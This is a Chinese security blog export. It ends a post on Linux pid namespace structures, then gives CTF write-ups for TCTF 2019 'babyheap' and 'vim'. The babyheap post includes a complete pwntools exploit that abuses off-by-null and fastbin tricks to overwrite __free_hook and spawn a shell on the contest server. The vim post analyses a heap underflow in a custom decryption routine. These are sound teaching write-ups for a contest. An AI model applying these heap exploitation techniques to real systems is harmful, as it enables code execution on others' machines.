<p>引入了 pid namespace 后，结构变得很复杂多了。进程如何和 struct pid 关联起来呢？内核为了统一管理 pid、进程组 pid 和会话 pid，将这三类 pid，进行了整合。现在 task_struct 要和三个 struct pid 关联，还要区分 struct pid 的类型。所以内核又引入了中间结构将 task_struct 和 pid 进行了 1 对 3 的关联。其结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_link</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pid</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .............</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid_link</span> <span class="title">pids</span>[<span class="title">PIDTYPE_MAX</span>];</span></span><br><span class="line">    .............</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> pid_type</span><br><span class="line">&#123;</span><br><span class="line">	PIDTYPE_PID,</span><br><span class="line">	PIDTYPE_PGID,</span><br><span class="line">	PIDTYPE_SID,</span><br><span class="line">	PIDTYPE_MAX</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sunichi/img-upload-for-picgo/master/ns/20200729100019.png"></p>
<p>其中进程 Ａ，Ｂ，Ｃ 是一个进程组的，Ａ 是组长进程，所以 B 和 C 的 task_struct 结构体中的 pid_link 成员的 node 字段就被邻接到进程 A 对应的 struct pid 中的 tasks[1]。 struct upid 通过 pid_hash 和 pid 数值关联了起来，这样就可以通过 pid 数值快速的找到所有命名空间的 upid 结构， numbers 是一个 struct pid 的最后一个成员，利用可变数组来表示这个pid结构当前有多少个命名空间。</p>
<h3 id="0x05-调试实验"><a href="#0x05-调试实验" class="headerlink" title="0x05 调试实验"></a>0x05 调试实验</h3><p>Todo</p>
<blockquote>
<p>参考资料：</p>
<p><a href="https://blog.csdn.net/zhangyifei216/article/details/49926459">https://blog.csdn.net/zhangyifei216/article/details/49926459</a></p>
<p><a href="https://carecraft.github.io/basictheory/2017/03/linux-pid-manage/">https://carecraft.github.io/basictheory/2017/03/linux-pid-manage/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>namespace</tag>
      </tags>
  </entry>
  <entry>
    <title>TCTF 2019 babyheap</title>
    <url>/2019/03/27/TCTF-2019-babyheap/</url>
    <content><![CDATA[<p>程序中的唯一漏洞就是在写入数据时发生了off-by-null。</p>
<a id="more"></a>

<p>程序中使用<code>calloc</code>函数作为分配堆块的函数，需要注意该函数不使用<code>tcache</code>，直接调用<code>_int_malloc</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_calloc (<span class="keyword">size_t</span> n, <span class="keyword">size_t</span> elem_size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av;</span><br><span class="line">  mchunkptr oldtop, p;</span><br><span class="line">  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line">  <span class="keyword">void</span> *mem;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> clearsize;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> nclears;</span><br><span class="line">  INTERNAL_SIZE_T *d;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始注意到程序分配了很大一块无用的堆块：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mmap(addr, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != addr )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1F000</span>uLL);</span><br></pre></td></tr></table></figure>

<p>这使得<code>top chunk</code>变得非常小了。因此就想到了通过耗尽<code>top chunk</code>来拿到<code>unsorted bin</code>的做法。</p>
<p>第一步先将需要用到的对应大小的<code>fastbin</code>对应的<code>tcache</code>填满，以获得<code>fastbin</code>，并且在分配的过程中不断向<code>top chunk</code>的<code>size</code>溢出<code>\x00</code>以更快的消耗其剩余大小。</p>
<p>在其中适当的位置释放空间连续的<code>fastbin</code>，当<code>top chunk</code>的剩余大小不足以满足分配申请时，将会调用<code>malloc_consolidate</code>函数对<code>fastbin</code>中的空闲chunk进行合并，并放入<code>small bin</code>中，由于申请了空间，<code>small bin</code>被分割后放入<code>unsorted bin</code>。利用常规的off by null和堆块重叠来泄漏地址并供后续<code>fastbin attack</code>。</p>
<p>在进行<code>fastbin attack</code>时，将<code>fd</code>指针指到<code>main_arena</code>中，先把<code>top chunk</code>指到堆的起始位置，即<code>tcache entry</code>处，获取该处内存以用来不断清空<code>tcache</code>计数。随后将<code>top chunk</code>指到<code>stdout</code>附近，通过不断申请、释放、清空<code>tcache</code>计数（避免chunk被放入fastbin而无法使用<code>top chunk</code>）的方法消耗<code>top chunk</code>使其移动到<code>__free_hook</code>附近，并将其改写成<code>one_gadget</code>，通过触发<code>free</code>来<code>getshell</code>。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">p, idx, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#p = process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;111.186.63.20&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(p, <span class="number">0x28</span>)</span><br><span class="line">        update(p, i, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span>)     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(p, i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(p, <span class="number">0x38</span>)</span><br><span class="line">        update(p, i, <span class="number">0x38</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>)     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(p, i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        add(p, <span class="number">0x48</span>)</span><br><span class="line">        update(p, i, <span class="number">0x48</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span>)     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(p, i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>): <span class="comment"># 0 ~ 3</span></span><br><span class="line">        add(p, <span class="number">0x38</span>)</span><br><span class="line">        update(p, i, <span class="number">0x38</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>) </span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x100</span>) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    update(p, <span class="number">4</span>, <span class="number">0x38</span>, payload)       </span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment"># 5</span></span><br><span class="line">    update(p, <span class="number">5</span>, <span class="number">0x48</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span>)</span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 6</span></span><br><span class="line">    update(p, <span class="number">6</span>, <span class="number">0x38</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>): <span class="comment"># 0 ~ 4</span></span><br><span class="line">        delete(p, i)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 0</span></span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 1</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment"># 2</span></span><br><span class="line">    update(p, <span class="number">2</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 3</span></span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 4</span></span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 5</span></span><br><span class="line">    add(p, <span class="number">0x38</span>) <span class="comment"># 8</span></span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment"># 4</span></span><br><span class="line">    view(p, <span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[5]: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7f8b3cdeaca0</span> - <span class="number">0x00007f8b3cc06000</span>)</span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment"># 9</span></span><br><span class="line">    target_address = libc.address + (<span class="number">0x7fd5d1e8bc55</span> - <span class="number">0x7fd5d1ca7000</span>)</span><br><span class="line">    <span class="comment"># 5 - 9 is same</span></span><br><span class="line">    delete(p, <span class="number">4</span>) <span class="comment">#4</span></span><br><span class="line">    delete(p, <span class="number">9</span>) <span class="comment">#9</span></span><br><span class="line">    delete(p, <span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">    view(p, <span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[5]: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    heap_address = u64(recv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(target_address)</span><br><span class="line">    update(p, <span class="number">5</span>, <span class="number">0x8</span>, p64(target_address))</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment"># 2 - 5 is same</span></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment"># 4</span></span><br><span class="line">    tcache_entry = heap_address - (<span class="number">0x563db82df850</span> - <span class="number">0x563db82c0000</span>)</span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(tcache_entry)</span><br><span class="line">    update(p, <span class="number">4</span>, len(payload), payload)</span><br><span class="line">    </span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 9</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment"># 10</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment"># 11</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment"># 12</span></span><br><span class="line">    update(p, <span class="number">12</span>, <span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x28</span>) </span><br><span class="line">    delete(p, <span class="number">10</span>)</span><br><span class="line">    delete(p, <span class="number">11</span>)</span><br><span class="line">    delete(p, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(libc.address + <span class="number">0x7ffff7fc3850</span> - <span class="number">0x00007ffff7dde000</span>)</span><br><span class="line">    </span><br><span class="line">    update(p, <span class="number">4</span>, len(payload), payload) </span><br><span class="line">    count = [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">      add(p, <span class="number">0x58</span>) <span class="comment"># 9</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">      delete(p, count[i])</span><br><span class="line">    update(p, <span class="number">12</span>, <span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x28</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        add(p, <span class="number">0x58</span>) <span class="comment"># 9</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        delete(p, count[i])</span><br><span class="line">      update(p, <span class="number">12</span>, <span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x28</span>) </span><br><span class="line">    </span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 9</span></span><br><span class="line">    update(p, <span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 10</span></span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment"># 11</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(libc.address + <span class="number">0x103f50</span>)</span><br><span class="line">    update(p, <span class="number">11</span>, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(heap_address)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    <span class="keyword">print</span> hex(target_address)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    delete(p, <span class="number">9</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50186 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x501e3 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x501ef execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf39f execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf3a3 execve(&quot;/bin/sh&quot;, rcx, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf3a6 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x103f50 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
      </tags>
  </entry>
  <entry>
    <title>TCTF 2019 vim</title>
    <url>/2019/04/04/TCTF-2019-vim/</url>
    <content><![CDATA[<p>自定义的加解密方法存在漏洞。</p>
<a id="more"></a>

<h4 id="0x00-源代码刨析"><a href="#0x00-源代码刨析" class="headerlink" title="0x00 源代码刨析"></a>0x00 源代码刨析</h4><p><code>key</code>设置为恒为字符串<code>a</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// to avoid interactive step, without loss of generality</span></span><br><span class="line">p1 = alloc(<span class="number">8</span>);</span><br><span class="line">p1[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">p1[<span class="number">1</span>] = NUL;</span><br></pre></td></tr></table></figure>

<p><code>cryptstate_T</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The state of encryption, referenced by cryptstate_T. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> shift;</span><br><span class="line">    <span class="keyword">int</span> step;</span><br><span class="line">    <span class="keyword">int</span> orig_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> cur_idx;</span><br><span class="line">    char_u *buffer;</span><br><span class="line">&#125; perm_state_T;</span><br></pre></td></tr></table></figure>

<p><code>init</code>函数，其中主要做的是计算<code>cryptstate_T</code>结构体的<code>key</code>，可以在此函数下断点验证传入的<code>key</code>是否为”a”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">crypt_perm_init(</span><br><span class="line">    cryptstate_T    *state,</span><br><span class="line">    char_u	    *key,</span><br><span class="line">    char_u	    *salt UNUSED,</span><br><span class="line">    <span class="keyword">int</span>		    salt_len UNUSED,</span><br><span class="line">    char_u	    *seed UNUSED,</span><br><span class="line">    <span class="keyword">int</span>		    seed_len UNUSED)</span><br><span class="line">&#123;</span><br><span class="line">    char_u	*p;</span><br><span class="line">    perm_state_T	*ps;</span><br><span class="line"></span><br><span class="line">    ps = (perm_state_T *)alloc(<span class="keyword">sizeof</span>(perm_state_T));</span><br><span class="line">    ps-&gt;key = <span class="number">0</span>;</span><br><span class="line">    state-&gt;method_state = ps;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (p = key; *p != NUL; ++p)</span><br><span class="line">    &#123;</span><br><span class="line">    ps-&gt;key = <span class="number">131</span>*ps-&gt;key + *p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">crypt_perm_decode(</span><br><span class="line">    cryptstate_T *state,</span><br><span class="line">    char_u	*from,</span><br><span class="line">    <span class="keyword">size_t</span>	len,</span><br><span class="line">    char_u	*to)</span><br><span class="line">&#123;</span><br><span class="line">    perm_state_T *ps = state-&gt;method_state;</span><br><span class="line">    <span class="keyword">size_t</span>	i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len&lt;=<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            to[i] = from[i];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> iv;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        to[i] = from[i];</span><br><span class="line">        iv = (iv&lt;&lt;<span class="number">8</span>) + from[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ps-&gt;orig_size = len<span class="number">-4</span>;</span><br><span class="line">    ps-&gt;size = ps-&gt;orig_size;</span><br><span class="line">    <span class="keyword">while</span> (!is_prime(ps-&gt;size))</span><br><span class="line">        ps-&gt;size++;</span><br><span class="line"></span><br><span class="line">    ps-&gt;shift = ps-&gt;key % (len<span class="number">-4</span>);</span><br><span class="line">    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">        ps-&gt;buffer = alloc(ps-&gt;shift);</span><br><span class="line">    ps-&gt;step = ps-&gt;key ^ iv;</span><br><span class="line">    <span class="keyword">if</span> (ps-&gt;step % ps-&gt;size == <span class="number">0</span>)</span><br><span class="line">        ps-&gt;step++;</span><br><span class="line">    ps-&gt;cur_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Step 1: Inverse of Multiplication */</span></span><br><span class="line">    i = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ps-&gt;cur_idx &lt; ps-&gt;orig_size)</span><br><span class="line">        &#123;</span><br><span class="line">            to[ps-&gt;cur_idx+<span class="number">4</span>] = from[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Step 2: Inverse of Addition */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">        ps-&gt;buffer[i] = to[i+<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">4</span>+ps-&gt;shift; i &lt; len; ++i)</span><br><span class="line">        to[i-ps-&gt;shift] = to[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">        to[len-ps-&gt;shift+i] = ps-&gt;buffer[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ps-&gt;shift &gt; <span class="number">0</span>)</span><br><span class="line">        vim_free(ps-&gt;buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要知道<code>IV</code>在头文件中的位置，漏洞主要在步骤1中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The state of encryption, referenced by cryptstate_T. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> shift;</span><br><span class="line">    <span class="keyword">int</span> step;</span><br><span class="line">    <span class="keyword">int</span> orig_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> cur_idx;</span><br><span class="line">    char_u *buffer;</span><br><span class="line">&#125; perm_state_T;</span><br><span class="line"></span><br><span class="line">crypt_perm_decode(</span><br><span class="line">    cryptstate_T *state,</span><br><span class="line">    char_u	*from,</span><br><span class="line">    <span class="keyword">size_t</span>	len,</span><br><span class="line">    char_u	*to)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Step 1: Inverse of Multiplication */</span></span><br><span class="line">    i = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ps-&gt;cur_idx &lt; ps-&gt;orig_size)</span><br><span class="line">        &#123;</span><br><span class="line">            to[ps-&gt;cur_idx+<span class="number">4</span>] = from[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里没有检查<code>ps-&gt;cur_idx</code>的值，导致可以控制其为负数，造成堆的前向溢出。</p>
<p><code>from</code>是vim打开的文件。<code>ps-&gt;step</code>可以通过</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> iv;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    to[i] = from[i];</span><br><span class="line">    iv = (iv&lt;&lt;<span class="number">8</span>) + from[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">ps-&gt;step = ps-&gt;key ^ iv;</span><br><span class="line"><span class="keyword">if</span> (ps-&gt;step % ps-&gt;size == <span class="number">0</span>)</span><br><span class="line">    ps-&gt;step++;</span><br><span class="line">ps-&gt;cur_idx = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>控制。</p>
<p>如果能改写<code>ps-&gt;buffer</code>的值，就能进一步利用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Step 2: Inverse of Addition */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">    ps-&gt;buffer[i] = to[i+<span class="number">4</span>];</span><br></pre></td></tr></table></figure>

<p>达到任意地址写的目的。</p>
<h4 id="0x01-Debug-it"><a href="#0x01-Debug-it" class="headerlink" title="0x01 Debug it"></a>0x01 Debug it</h4><p>生成脚本：</p>
